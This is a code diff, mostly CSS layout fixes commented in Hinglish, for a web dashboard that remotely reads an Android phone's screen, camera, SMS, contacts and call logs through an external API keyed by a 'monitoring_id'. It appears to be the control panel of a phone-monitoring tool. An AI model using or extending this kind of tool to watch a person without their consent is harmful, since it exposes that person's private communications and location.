@@ -15,7 +15,6 @@
             --accent: #4caf50;
             --offline: #ff4444;
             --cyan: #00f3ff;
-            /* New Slider Variables */
             --slider-bg: rgba(60, 60, 60, 0.6);
             --slider-fill: rgba(255, 255, 255, 1);
         }
@@ -27,16 +26,20 @@
             margin: 0; padding: 20px;
             display: flex; flex-direction: column; align-items: center;
             min-height: 100vh;
-            /* Prevent page scroll when using sliders on mobile */
             touch-action: pan-y; 
         }
+        
+        /* Container ko strict width di hai taaki desktop par bhi phone jaisa dikhe */
         .container {
-            width: 100%; max-width: 450px;
+            width: 100%; 
+            max-width: 420px; /* Thora aur compact kiya taaki buttons bikhre nahi */
             background: rgba(0, 0, 0, 0.5);
-            border-radius: 30px; padding: 20px;
+            border-radius: 35px; padding: 25px;
             border: 1px solid var(--glass-border);
             margin-bottom: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
+
         .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
         .device-name { font-size: 1.1rem; font-weight: bold; text-transform: uppercase; color: var(--cyan); }
         .status-badge {
@@ -65,81 +68,74 @@
             text-decoration: underline; cursor: pointer; margin-bottom: 25px; display: block;
         }
 
-        /* --- NEW IPHONE STYLE VERTICAL SLIDERS --- */
+        /* --- SLIDER & GRID FIXES --- */
         .controls-grid { 
             display: grid; 
             grid-template-columns: repeat(4, 1fr); 
-            /* Row height fixed to make sliders span correctly */
             grid-auto-rows: 85px; 
-            gap: 12px; 
+            gap: 12px; /* Gap thora adjust kiya */
         }
 
         .slider-card {
-            grid-row: span 2; /* Makes it tall (takes 2 rows space) */
+            grid-row: span 2; 
             background: var(--slider-bg);
             border-radius: 25px;
             position: relative;
             overflow: hidden;
             display: flex;
-            align-items: flex-end; /* Align content to bottom */
+            align-items: flex-end; 
             justify-content: center;
             border: 1px solid var(--glass-border);
-            touch-action: none; /* Prevents scroll lag on phone */
+            touch-action: none;
+            
+            /* -- MAGIC FIX FOR THIN SLIDERS -- */
+            width: 70%; /* Slider ko column ka sirf 70% width diya */
+            margin: 0 auto; /* Center kar diya */
         }
 
-        /* The White fill part */
         .slider-fill {
-            position: absolute;
-            bottom: 0; left: 0; right: 0;
-            background: var(--slider-fill);
-            width: 100%;
-            height: 50%; /* Default height */
-            transition: height 0.1s linear;
-            pointer-events: none; /* Clicks go through to input */
+            position: absolute; bottom: 0; left: 0; right: 0;
+            background: var(--slider-fill); width: 100%; height: 50%;
+            transition: height 0.1s linear; pointer-events: none;
         }
 
-        /* The Icon inside the slider */
         .slider-icon {
-            position: absolute;
-            bottom: 25px;
-            font-size: 1.5rem;
-            z-index: 5;
-            color: #555; /* Icon color changes via JS */
-            transition: color 0.2s;
-            pointer-events: none;
+            position: absolute; bottom: 25px; font-size: 1.4rem; z-index: 5;
+            color: #555; transition: color 0.2s; pointer-events: none;
         }
 
-        /* Invisible Range Input on top to capture touches */
         .vertical-range {
-            position: absolute;
-            width: 200px; /* Needs to be wider because it's rotated */
-            height: 100%;
+            position: absolute; width: 200px; height: 100%;
             top: 0; left: 50%;
-            transform: translate(-50%, 0) rotate(-90deg); /* Rotate vertical */
-            opacity: 0; /* Invisible */
-            cursor: ns-resize;
-            z-index: 10;
+            transform: translate(-50%, 0) rotate(-90deg);
+            opacity: 0; cursor: ns-resize; z-index: 10;
         }
-        /* ----------------------------------------- */
         
+        /* Buttons Fix */
         .control-btn {
             background: var(--glass-bg); border-radius: 18px; aspect-ratio: 1/1;
             display: flex; flex-direction: column; align-items: center; justify-content: center;
             border: 1px solid var(--glass-border); cursor: pointer;
             transition: 0.2s; text-decoration: none; color: var(--text-main);
+            overflow: hidden; /* Overlap rokne ke liye */
         }
         .control-btn:hover { background: rgba(255, 255, 255, 0.15); transform: translateY(-2px); border-color: var(--accent); }
         .control-btn i { font-size: 1.2rem; margin-bottom: 6px; }
-        .control-btn span { font-size: 0.6rem; text-align: center; color: #bbb; }
+        .control-btn span { font-size: 0.6rem; text-align: center; color: #bbb; white-space: nowrap; }
 
-        /* Active state for sound/rec buttons */
         .control-btn.active-state { background: rgba(255, 255, 255, 0.9); color: #000; }
         .control-btn.active-state span { color: #333; }
         
+        /* --- ID INPUT FIX FOR DESKTOP --- */
         .id-display { 
-            margin-bottom: 15px; font-size: 0.8rem; color: var(--cyan); cursor: pointer; 
-            border: 1px dashed var(--cyan); padding: 8px 20px; border-radius: 12px;
-            background: rgba(0, 243, 255, 0.05); width: 80%; text-align: center;
+            margin-bottom: 20px; font-size: 0.9rem; color: var(--cyan); cursor: pointer; 
+            border: 1px dashed var(--cyan); padding: 12px 20px; border-radius: 15px;
+            background: rgba(0, 243, 255, 0.05); text-align: center;
+            
+            /* Desktop par size fix karne ke liye */
+            width: 90%; 
+            max-width: 320px; /* Phone size se bada nahi hoga ab */
+            margin-left: auto; margin-right: auto;
         }
     </style>
 </head>
@@ -185,7 +181,6 @@
 
         <span class="change-id-btn" onclick="resetID()">Change Device ID</span>
 
-
         <div class="controls-grid">
             <div onclick="openView('screen')" class="control-btn"><i class="fa-solid fa-mobile-screen"></i><span>Screen</span></div>
             <div onclick="openView('camera')" class="control-btn"><i class="fa-solid fa-camera"></i><span>Camera</span></div>
@@ -226,18 +221,17 @@
             <div onclick="openView('call_logs')" class="control-btn"><i class="fa-solid fa-phone"></i><span>Calls</span></div>
             <div onclick="openView('contacts')" class="control-btn"><i class="fa-solid fa-address-book"></i><span>Contacts</span></div>
             <div onclick="openView('sms')" class="control-btn"><i class="fa-solid fa-comments"></i><span>SMS</span></div>
-            <div class="control-btn" style="opacity:0; pointer-events:none;"></div> </div>
+            <div class="control-btn" style="opacity:0; pointer-events:none;"></div> 
+        </div>
     </div>
 
     <script>
         const API_BASE = 'https://child-v9no.onrender.com';
         let DEVICE_ID = localStorage.getItem('monitoring_id') || '';
 
-        // --- Init Logic ---
         function initDashboard() {
             if(DEVICE_ID) {
                 document.getElementById('idInputPanel').style.display = 'none';
-                // Load cached model name for instant "Connected" feel
                 const cachedModel = localStorage.getItem('last_model');
                 if(cachedModel) {
                     document.getElementById('deviceName').innerText = cachedModel;
@@ -291,7 +285,6 @@
                         document.getElementById('deviceName').innerText = data.model || DEVICE_ID;
                         localStorage.setItem('last_model', data.model || DEVICE_ID);
                         document.getElementById('androidVer').innerText = data.version || "--";
-                        
                         setStatus(data.isOnline);
                         document.getElementById('networkType').innerText = data.isOnline ? "Online" : "Last Seen";
                         
@@ -304,7 +297,6 @@
                 .catch(err => console.log("Connection Error:", err));
         }
 
-        // --- Navigation ---
         function openView(page) {
             if(!DEVICE_ID) return askID();
             window.location.href = `view_${page}.html?id=${DEVICE_ID}`;
@@ -324,21 +316,12 @@
             console.log("Sent: " + action);
         }
 
-        // --- New Slider UI Logic ---
         function updateSliderUI(type, val) {
-            // Update the white fill height
             document.getElementById(`${type}Fill`).style.height = val + "%";
-            
-            // Change icon color based on fill level (dark icon on white fill)
             const icon = document.getElementById(`${type}Icon`);
-            if(val > 25) {
-                icon.style.color = "#333"; 
-            } else {
-                icon.style.color = "#fff";
-            }
+            if(val > 25) { icon.style.color = "#333"; } else { icon.style.color = "#fff"; }
         }
 
-        // --- Sound & Rec Logic ---
         let modes = ['normal', 'vibrate', 'silent'];
         let icons = ['fa-bell', 'fa-vibration', 'fa-bell-slash'];
         let labels = ['Normal', 'Vibrate', 'Silent'];
@@ -349,16 +332,13 @@
             const icon = document.getElementById('soundIcon');
             const text = document.getElementById('soundText');
             const btn = document.getElementById('soundBtn');
-            
             icon.className = `fa-solid ${icons[currentModeIndex]}`;
             text.innerText = labels[currentModeIndex];
-
             if(modes[currentModeIndex] === 'silent' || modes[currentModeIndex] === 'vibrate') {
                  btn.classList.add('active-state');
             } else {
                  btn.classList.remove('active-state');
             }
-            
             sendCommand(modes[currentModeIndex]);
         }
 
@@ -377,7 +357,6 @@
             }
         }
 
-        // Auto Refresh Loop
         setInterval(updateDashboard, 5000);
         window.onload = initDashboard;
     </script>
